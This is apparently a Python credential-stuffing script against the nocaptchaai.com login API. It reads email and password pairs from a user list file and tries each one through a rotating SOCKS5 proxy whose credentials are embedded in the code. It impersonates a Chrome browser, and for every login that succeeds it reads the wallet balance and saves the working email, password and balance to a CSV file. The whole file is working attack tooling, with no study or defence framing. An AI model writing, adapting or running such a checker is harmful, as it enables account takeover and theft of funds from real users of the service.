import csv

from curl_cffi.requests import post,Session
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor

headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://nocaptchaai.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://nocaptchaai.com/auth/login',
    'sec-ch-ua': '"Google Chrome";v="153", "Not_A Brand";v="8", "Chromium";v="153"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36',
    'x-captcha-token': '',
}



def loging(i,email, Password):

    try:
        Sessionx = Session(impersonate='chrome')
        json_data = {

            'data': email,
            'password': Password,
        }
    
        response = Sessionx.post('https://nocaptchaai.com/api/account/signin',  headers=headers, json=json_data,
        proxies={"http": "socks5://USER061411-zone-custom:0f4935@global.rotgb.711proxy.com:10000","https": "socks5://USER061411-zone-custom:0f4935@global.rotgb.711proxy.com:10000",}
         
                        )
        print(response.json())
        if 'Login successful'  in response.text:
            response = Sessionx.get('https://nocaptchaai.com/api/wallet/balance', cookies=response.cookies, headers=headers)
            data = response.json()
            balance = data.get('data', {}).get('balance', 0)
            print(f'[{i}] {response.status_code} | {email} | {Password} | Valid | Balance: {balance}'   )
            csv_file = 'users_filter_valid__.csv'
            with open(csv_file, 'a', newline='', encoding='utf-8') as file:
                writer = csv.writer(file)
                writer.writerow(["Email", "Password", "Balance"])  # Write header if needed
                writer.writerow([email, Password, balance])
            
    except Exception as e:
        print(f"Error: {email}")
        pass
with open('nocaptchaaicom_users.txt', 'r', encoding='utf-8') as f:
    csa = {line.strip() for line in f if line.strip()}
# with ThreadPoolExecutor(max_workers=5) as executor:
#     for i,u in enumerate(csa):
#         try:
#             email=u.split("|")[0]
#             Password=u.split("|")[1]

#             executor.submit(loging,i,email,Password)
#         except Exception as e:
#             pass



for i,u in enumerate(csa):
    try:
        email=u.split("|")[1]
        Password=u.split("|")[2]
        loging(i, email, Password)
        # executor.submit(loging,i,base_url.replace('http://','https://').replace(' ',":"),email,Password)
    except Exception as e:
        pass


